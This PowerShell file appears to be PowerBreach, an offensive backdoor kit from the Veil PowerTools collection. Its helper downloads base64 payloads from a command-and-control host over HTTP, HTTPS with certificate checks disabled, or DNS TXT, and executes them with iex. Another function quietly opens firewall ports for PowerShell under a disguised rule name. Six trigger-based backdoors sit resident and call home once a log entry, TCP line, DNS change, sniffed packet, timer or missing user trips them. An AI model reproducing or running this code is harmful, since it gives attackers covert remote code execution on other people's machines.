###################################################################################
# Name: PowerBreach
# Author: @sixdub  (sixdub.net)
# Tested on: Windows 7
# Description: PowerBreach is a backdoor kit to provide a large variety of non
#				persistent backdoors to remain resident on systems. PowerBreach is
#				apart of the Veil PowerTools collection and can be combined with
#				other PowerTools.
# License: 3 Clause BSD License (see README.md)
###################################################################################

function Invoke-CallbackIEX
{
<#
.SYNOPSIS
HELPER FUNCTION. Used to callback to C2 and execute script
.DESCRIPTION
Used to initiate a callback to a defined node and request a resource. The resource is then decoded and executed as a powershell script. There are many methods for callbacks.
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackURI
The URI Address of the host to callback to.
The accepted protocols are: HTTP, HTTPS, BITS
.PARAMETER BitsTempFile
The path to place a file on disk temporarily when BITS is the chosen method. Default is "%USERTEMP%\ps_conf.cfg".
#>
	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackURI
	)
	
	#if you have a place to call home too...
	if($CallbackURI)
	{
		try 
		{
		
			#Parse some information from URI just in case we need it
			$parts = $CallbackURI -Split '://'
			$protocol=$parts[0].ToLower()
			$server=(($parts[1] -split "/")[0] -split ":")[0]
			$port=(($parts[1] -split "/")[0] -split ":")[1]
			
			Write-Verbose "URI: $CallbackURI"
			Write-Verbose "Protocol: $protocol"
			Write-Verbose "Server: $server"
			Write-Verbose "Port: $port"
			
			#HTTP Method
			if ($protocol -eq "http")
			{
				#Set the url
				Write-Verbose "Calling home with http to: $CallbackURI"
				#download string from the URL
				$enc = (New-Object net.webclient).downloadstring($CallbackURI)
			}
			#HTTPS Method
			elseif ($protocol -eq "https")
			{
				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
				Write-Verbose "Calling home with https to: $CallbackURI"
				#download string from the URL with HTTPS
				$enc = (New-Object net.webclient).downloadstring($CallbackURI)
			}
			#SINGLE LINE DNS TXT RECORD
			elseif ($protocol -eq "dnstxt")
			{
				Write-Verbose "Calling home with dnstxt to: $server"
				$enc = (nslookup -querytype=txt $server | Select-String -Pattern '"*"') -split '"'[0]
			}
			else 
			{
				Write-Error "Error: Improper protocol?"
				return $False
			}
			
			#Check to make sure something got downloaded, if so, decode it and 
			if ($enc)
			{
				#decode the string
				$b = [System.Convert]::FromBase64String($enc)
				$dec = [System.Text.Encoding]::UTF8.GetString($b)
				#execute script
				iex($dec)
			}
			else
			{
				Write-Error "Error: No Data Downloaded"
				return $False
			}
		}
		catch [System.Net.WebException]{
			Write-Error "Error: Network Callback failed"
			return $False
		}
		catch [System.FormatException]{
			Write-Error "Error: Base64 Format Problem"
			return $False
		}
		catch [System.Exception]{
			Write-Error "Error: Uknown problem during transfer"
			#$_.Exception | gm
			return $False
		}
	}
	else
	{
		Write-Error "No host specified for the phone home :("
		return $False
	}
	
	return $True
}

function Add-PSFirewallRules
{
<#
.SYNOPSIS
Used to open a hole in the firewall to allow Powershell to communicate
.DESCRIPTION
Opens 4 rules in the firewall, 2 for each direction. Allows TCP and UDP communications on ports 1-65000. This will hopefully prevent popups from displaying to interactive user. 
Admin Reqd? Yes
Firewall Hole Reqd? No
.PARAMETER RuleName
The name of the rule to be added to the firewall. This should be stealthy. Default="Windows Powershell"
.PARAMETER ExePath
The program to allow through the filewall. Default="C:\windows\system32\windowspowershell\v1.0\powershell.exe"
.PARAMETER Ports
The ports to allow communications on. Default="1-65000"
#>
	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$RuleName="Windows Powershell",
	[Parameter(Mandatory=$False,Position=2)]
	[string]$ExePath="$PSHome\powershell.exe",
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Ports="1-65000"
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Error "This command requires Admin :(... get to work! "
		Return 0
	}
	
	#Rule 1, TCP, Outbound
	$fw = New-Object -ComObject hnetcfg.fwpolicy2
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$True
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$False
	$fw.Rules.Add($rule)
	
	#Rule 2, UDP Outbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 2
	$rule.Enabled=$True
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$False
	$fw.Rules.Add($rule)
	
	#Rule 3, TCP Inbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 6
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$True
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$False
	$fw.Rules.Add($rule)
	
	#Rule 4, UDP Inbound
	$rule = New-Object -ComObject HNetCfg.FWRule
	$rule.Name = $RuleName
	$rule.ApplicationName=$ExePath
	$rule.Protocol = 17
	$rule.LocalPorts = $Ports
	$rule.Direction = 1
	$rule.Enabled=$True
	$rule.Grouping="@firewallapi.dll,-23255"
	$rule.Profiles = 7
	$rule.Action=1
	$rule.EdgeTraversal=$False
	$fw.Rules.Add($rule)

	return 1

}

function Invoke-EventLogBackdoor
{
<#
.SYNOPSIS
Starts the event-loop backdoor
.DESCRIPTION
The backdoor continually parses the Security event logs. For every entry, it checks to see if the message contains a unique trigger value. If it finds the trigger, it calls back to a predefined IP Address. This backdoor is based on the Shmoocon presentation "Wipe the Drive". See here for more info: XXXXXXXXX
Admin Reqd? Yes
Firewall Hole Reqd? No
.PARAMETER CallbackURI
The URI of the host to callback to
.PARAMETER Trigger
The unique value to look for in every event packet. In the case of RDP, this will be the username you use to attempt a login. Default="HACKER"
.PARAMETER Timeout
A value in seconds to continue running the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The time to sleep in between event log checks. 
#>
	Param(
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackURI,
	[Parameter(Mandatory=$False,Position=2)]	
	[string]$Trigger="HACKER", 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=4)]
	[int]$Sleep=30
	)

	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Error "This backdoor requires Admin :(... get to work! "
		Return
	}
	#Output info
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Trigger: $Trigger"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose "Starting backdoor..."
	
	#initiate loop variables
	$running=$True
	$match =""
	$starttime = Get-Date
	while($running)
	{
		#check timeout value
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$False
		}
		#grab all events since the last cycle and store their "message" into a variable
		$d = Get-Date
		$NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String
		
		#check if the events contain our trigger value
		if ($NewEvents -match $Trigger)
		{
				$running=$False
				$match = $CallbackURI
				Write-Verbose "Match: $match"
		}
		while($match)
		{
			$success = Invoke-CallbackIEX $match
			if ($success)
			{
				return
			}
			Start-Sleep -s $sleep
		}
		
		Start-Sleep -s $Sleep
	}

}

function Invoke-PortBindBackdoor
{
<#
.SYNOPSIS
Starts the TCP Port Bind backdoor
.DESCRIPTION
The backdoor opens a TCP port on a specified port. For every connection to the port, it looks for a specified trigger value. When found, it initiates a callback and closes the TCP Port. 
Admin Reqd? No
Firewall Hole Reqd? Yes
.PARAMETER CallbackURI
The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
.PARAMETER LocalIP
The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
.PARAMETER Port
The port to bind. Default=4444
.PARAMETER Trigger
The unique value the backdoor is waiting for. Default="QAZWSX123"
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The time to sleep in between event log checks. 
.PARAMETER AddFWRules
Whether or not to add the firewall rules automatically. 
#>
	Param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackURI,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[int]$Port=4444, 
	[Parameter(Mandatory=$False,Position=4)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=5)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=6)]
	[int] $Sleep=30,
	[Parameter(Mandatory=$False,Position=7)]
	[switch] $AddFWRules=$False
	)
	
	if ($AddFWRules)
	{
		Write-Verbose "Adding FW Exception"
		$FWSuccess = Add-PSFirewallRules
		if($FWSuccess)
		{
			Write-Verbose "FW Exception Added"
		}
		else
		{
			Write-Verbose "FW Exception Failed... Quitting"
			Return 0
		}
	}
	else
	{
		Write-Verbose "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	}

	# try to figure out which IP address to bind to by looking at the default route
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	#output info
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Port: $Port"
	Write-Verbose "Trigger: $Trigger"
	Write-Verbose "Using IPv4 Address: $LocalIP"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose "Starting backdoor..."
	try{
		
		#Define and initialize all the networking stuff
		$ipendpoint = New-Object system.net.ipendpoint([net.ipaddress]"$localIP",$Port)
		$Listener = New-Object System.Net.Sockets.TcpListener $ipendpoint
		$Listener.Start()
		
		#set variables for the loop
		$running=$True
		$match =""
		$starttime = Get-Date
		while($running)
		{			
			#Check for timeout
			if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
			{
				$running=$False
			}
			
			#If there is a connection pending on the socket
			if($Listener.Pending())
			{
				#accept the client and define the input stream
				$Client = $Listener.AcceptTcpClient()
				Write-Verbose "Client Connected!"
				$Stream = $Client.GetStream()
				$Reader = New-Object System.IO.StreamReader $Stream
				
				#read one line off the socket
				$line = $Reader.ReadLine()
				
				#check to see if proper trigger value
				if ($line -eq $Trigger)
				{
					$running=$False
					$match = ([system.net.ipendpoint] $Client.Client.RemoteEndPoint).Address.ToString()
					Write-Verbose "MATCH: $match"
				}
				
				#clean up
				$reader.Dispose()
				$stream.Dispose()
				$Client.Close()
				Write-Verbose "Client Disconnected"
			}
			if($match)
			{
				#Stop the socket and check for match
				Write-Verbose "Stopping Socket"
				$Listener.Stop()
			}
			while($match)
			{
				if($CallbackURI)
				{
					$success = Invoke-CallbackIEX $CallbackURI
				}
				else
				{
					$success = Invoke-CallbackIEX "http://$Match"
				}
				
				if ($success)
				{
					return 1
				}
				Start-Sleep -s $sleep
			}
		}

	}
	catch [System.Net.Sockets.SocketException] {
		Write-Error "Error: Socket Error"
	}
}

function Invoke-ResolverBackdoor
{
<#
.SYNOPSIS
Starts the Resolver Backdoor 
.DESCRIPTION
This backdoor resolves a predefined hostname at a preset interval. If the resolved address is different than the specified trigger, than it initiates a callback.
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackURI
The IP Address of the host to callback to. By default, this backdoor calls back to the newly resolved IP Address.
.PARAMETER Hostname
The hostname to routinely check for a trigger
.PARAMETER Trigger
The IP Address that the backdoor is looking for. Default="127.0.0.1"
.PARAMETER Timeout
The time to run the backdoor (in seconds). Default=0 (run forever)
.PARAMETER Sleep
The seconds to sleep between DNS resolution (in seconds). Default=30
#>
	param(
		[Parameter(Mandatory=$False,Position=1)]
		[string]$CallbackURI,
		[Parameter(Mandatory=$False,Position=2)]
		[string]$Hostname,
		[Parameter(Mandatory=$False,Position=3)]
		[string]$Trigger="127.0.0.1",
		[Parameter(Mandatory=$False,Position=4)]
		[int] $Timeout=0,
		[Parameter(Mandatory=$False,Position=5)]
		[int] $Sleep=30
	)
	
	#output info
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Sleep Time: $Sleep"
	Write-Verbose "Trigger: $Trigger"
	Write-Verbose "Using Hostname: $Hostname"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose "Starting backdoor..."
	
	#set loop variables
	$running=$True
	$match =""
	$starttime = Get-Date
	while($running)
	{
		#check timeout
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$False
		}
		
		try {
			#try to resolve hostname
			$ips = [System.Net.Dns]::GetHostAddresses($Hostname)
			foreach ($addr in $ips)
			{
				#take all of the IPs returned and check to see if they have changed from our "trigger
				#If they do not match the trigger, use it for C2 address
				$resolved=$addr.IPAddressToString
				if($resolved -ne $Trigger)
				{
					$running=$False
					$match=$resolved
					Write-Verbose "Match: $match"
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}
		while($match)
		{
			if($CallbackURI)
			{
				$success = Invoke-CallbackIEX $CallbackURI
			}
			else
			{
				$success = Invoke-CallbackIEX "http://$Match"
			}		
			if ($success)
			{
				return
			}
			Start-Sleep -s $sleep
			
		}
		Start-Sleep -s $Sleep
	}

}

function Invoke-PortKnockBackdoor
{	
<#
.SYNOPSIS
Starts the Packet Knock backdoor
.DESCRIPTION
The backdoor sniffs packets destined for a certain interface. In each packet, a trigger value is looked for. The the trigger value is found, the backdoor initiates a callback. This backdoor utilizes a promiscuous socket and should not open up a port on the system. 
Admin Reqd? Yes
Firewall Hole Reqd? Yes
.PARAMETER CallbackURI
The IP Address of the host to callback to. By default, this backdoor calls back to whoever triggered it. 
.PARAMETER LocalIP
The interface to bind the TCP port to. By default, the script will use the default GW to determine this value. 
.PARAMETER Trigger
The unique value the backdoor is waiting for. Default="QAZWSX123"
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The time to sleep in between event log checks. 
.PARAMETER AddFWRules
Whether or not to add the firewall rules automatically. 
#>
	param(
	[Parameter(Mandatory=$False,Position=1)]
	[string]$CallbackURI,
	[Parameter(Mandatory=$False,Position=2)]
	[string]$LocalIP, 
	[Parameter(Mandatory=$False,Position=3)]
	[string]$Trigger="QAZWSX123", 
	[Parameter(Mandatory=$False,Position=4)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=5)]
	[int] $Sleep=30,
	[Parameter(Mandatory=$False,Position=6)]
	[switch] $AddFWRules=$False
	)
	If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
	{
		Write-Error "This backdoor requires Admin :(... get to work! "
		Return 0
	}

	if ($AddFWRules)
	{
		Write-Verbose "Adding FW Exception"
		$FWSuccess = Add-PSFirewallRules
		if($FWSuccess)
		{
			Write-Verbose "FW Exception Added"
		}
		else
		{
			Write-Verbose "FW Exception Failed... Quitting"
			Return 0
		}
	}
	else
	{
		Write-Verbose "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	}

	# try to figure out which IP address to bind to by looking at the default route
	if (-not $LocalIP) 
	{
		route print 0* | % { 
			if ($_ -match "\s{2,}0\.0\.0\.0") { 
				$null,$null,$null,$LocalIP,$null = [regex]::replace($_.trimstart(" "),"\s{2,}",",").split(",")
				}
			}
	}
	
	#output info
	Write-Verbose "!!! THIS BACKDOOR REQUIRES FIREWALL EXCEPTION !!!"
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Trigger: $Trigger"
	Write-Verbose "Using IPv4 Address: $LocalIP"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose "Starting backdoor..."
	
	#define bytes for socket setup
	$byteIn = New-Object byte[] 4
	$byteOut = New-Object byte[] 4
	$byteData = New-Object byte[] 4096  # size of data

	$byteIn[0] = 1  # this enables promiscuous mode (ReceiveAll)
	$byteIn[1-3] = 0
	$byteOut[0-3] = 0
	
	#Open a raw socket and set to promiscuous mode. Include the IP Header
	$socket = New-Object system.net.sockets.socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
	$socket.setsocketoption("IP","HeaderIncluded",$True)
	$socket.ReceiveBufferSize = 819200

	#set the local socket info and bind it
	$ipendpoint = New-Object system.net.ipendpoint([net.ipaddress]"$localIP",0)
	$socket.bind($ipendpoint)

	#turn on promiscuous
	[void]$socket.iocontrol([net.sockets.iocontrolcode]::ReceiveAll,$byteIn,$byteOut)

	#set loop data
	$starttime = Get-Date
	$running = $True
	$match = ""
	$packets = @()
	while ($running)
	{
		#check timeout
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$False
		}
		#check for queued up packets
		if (-not $socket.Available)
		{
			Start-Sleep -milliseconds 500
			continue
		}
		
		#Take any date off the socket
		$rcv = $socket.receive($byteData,0,$byteData.length,[net.sockets.socketflags]::None)

		# Created streams and readers
		$MemoryStream = New-Object System.IO.MemoryStream($byteData,0,$rcv)
		$BinaryReader = New-Object System.IO.BinaryReader($MemoryStream)
		
		# Trash all the header bytes we dont care about. RFC 791
		$trash  = $BinaryReader.ReadBytes(12)
		
		#Read the SRC and DST IP
		$SourceIPAddress = $BinaryReader.ReadUInt32()
		$SourceIPAddress = [System.Net.IPAddress]$SourceIPAddress
		$DestinationIPAddress = $BinaryReader.ReadUInt32()
		$DestinationIPAddress = [System.Net.IPAddress]$DestinationIPAddress
		$RemainderBytes = $BinaryReader.ReadBytes($MemoryStream.Length)
		
		#Convert the remainder of the packet into ASCII
		$AsciiEncoding = New-Object system.text.asciiencoding
		$RemainderOfPacket = $AsciiEncoding.GetString($RemainderBytes)
		
		#clean up clean up
		$BinaryReader.Close()
		$memorystream.Close()
		
		#check rest of packet for trigger value
		if ($RemainderOfPacket -match $Trigger)
		{
			Write-Verbose "Match: $SourceIPAddress"
			$running=$False
			$match = $SourceIPAddress
		}
	}
	
	while($match)
	{
		if($CallbackURI)
		{
			$success = Invoke-CallbackIEX $CallbackURI
		}
		else
		{
			$success = Invoke-CallbackIEX $Match
		}
		if ($success)
		{
			return 1
		}
		Start-Sleep -s $sleep
		
	}
	
}

function Invoke-LoopBackdoor
{
<#
.SYNOPSIS
Starts the Callback loop backdoor
.DESCRIPTION
The backdoor initiates a callback on a routine interval. If successful in executing a script, the backdoor will exit. 
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackURI
The IP Address of the host to callback to.  
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The seconds to sleep between callback. Default=1. 
#>
	Param(  
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackURI,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=3)]
	[int] $Sleep=30
	)
	
	#Output info
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Sleep: $Sleep"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose
	Write-Verbose "Starting backdoor..."
	
	#initiate loop variables
	$running=$True
	$match =""
	$starttime = Get-Date
	while($running)
	{
		#check timeout value
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$False
		}

		$success = Invoke-CallbackIEX $CallbackURI
		
		if($success)
		{
			return
		}
		
		Start-Sleep -s $Sleep
	}

}

function Invoke-DeadUserBackdoor
{
<#
.SYNOPSIS
Backup backdoor for a backdoor user
.DESCRIPTION
The backdoor inspects the local system or domain for the presence of a user and calls back if it is not found 
Admin Reqd? No
Firewall Hole Reqd? No
.PARAMETER CallbackURI
The IP Address of the host to callback to.  
.PARAMETER Timeout
The time to run the backdoor. Default=0 (run forever)
.PARAMETER Sleep
The seconds to sleep between callback. Default=1. 
.PARAMETER Username
The user to look for
.PARAMETER Domain
The domain to inspect. By default looks at local system
#>
	Param(  
	[Parameter(Mandatory=$True,Position=1)]
	[string]$CallbackURI,
	[Parameter(Mandatory=$False,Position=2)]
	[int]$Timeout=0,
	[Parameter(Mandatory=$False,Position=3)]
	[int] $Sleep=30,
	[Parameter(Mandatory=$True,Position=4)]
	[string] $Username,
	[Parameter(Mandatory=$False,Position=5)]
	[switch] $Domain
	)
	
	#Output info
	Write-Verbose "Timeout: $Timeout"
	Write-Verbose "Sleep: $Sleep"
	Write-Verbose "CallbackURI: $CallbackURI"
	Write-Verbose "Username: $Username"
	Write-Verbose "Domain: $Domain"
	Write-Verbose "Starting backdoor..."
	
	#initiate loop variables
	$running=$True
	$match =""
	$starttime = Get-Date
	while($running)
	{
		#check timeout value
		if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))  # if user-specified timeout has expired
		{
			$running=$False
		}
		
		#Check for the user... 
		if($Domain)
		{
			$UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
			$UserSearcher.PageSize = 1000
			$count = @($UserSearcher.FindAll()).Count
			if($count -eq 0)
			{
				Write-Verbose "Domain user $Username not found!"
				$match=$True
			}
		}
		else
		{
			$comp = $env:computername
			[ADSI]$server="WinNT://$comp"
			$usercheck = $server.children | where{$_.schemaclassname -eq "user" -and $_.name -eq $Username}
			if(-not $usercheck)
			{
				Write-Verbose "Local user $Username not found!"
				$match=$True
			}
		}
		
		#if there is no user found, a match will trip
		while($match)
		{
			$success = Invoke-CallbackIEX $CallbackURI
			
			if ($success)
			{
				return
			}
			Start-Sleep -s $sleep
		}
		Start-Sleep -s $Sleep
	}	
}
